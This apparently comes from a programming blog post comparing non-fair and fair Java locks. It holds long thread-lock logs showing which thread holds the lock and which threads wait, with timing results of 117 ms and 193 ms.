Lock by[10],Waiting by[9,]
Lock by[10],Waiting by[9,11,]
Lock by[10],Waiting by[9,11,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[10],Waiting by[9,11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[9],Waiting by[11,12,13,]
Lock by[11],Waiting by[12,13,]
Lock by[11],Waiting by[12,13,]
Lock by[11],Waiting by[12,13,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[11],Waiting by[12,13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[12],Waiting by[13,9,]
Lock by[13],Waiting by[9,]
Lock by[13],Waiting by[9,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[13],Waiting by[9,12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[9],Waiting by[12,]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
Lock by[12],Waiting by[]
cost:117 ms

View Code
　　公平性锁的测试结果，cost:193 ms


Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[14],Waiting by[]
Lock by[15],Waiting by[]
Lock by[14],Waiting by[15,]
Lock by[15],Waiting by[14,]
Lock by[14],Waiting by[15,]
Lock by[15],Waiting by[14,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,15,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,15,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,15,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,15,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,15,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,15,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,15,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,15,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,15,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,15,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,14,]
Lock by[16],Waiting by[14,15,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,17,]
Lock by[15],Waiting by[16,17,14,]
Lock by[16],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,18,]
Lock by[14],Waiting by[15,18,17,]
Lock by[15],Waiting by[18,17,14,]
Lock by[18],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,18,]
Lock by[14],Waiting by[15,18,17,]
Lock by[15],Waiting by[18,17,14,]
Lock by[18],Waiting by[17,14,15,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,14,]
Lock by[16],Waiting by[18,17,14,15,]
Lock by[18],Waiting by[17,14,15,16,]
Lock by[17],Waiting by[14,15,16,18,]
Lock by[14],Waiting by[15,16,18,17,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
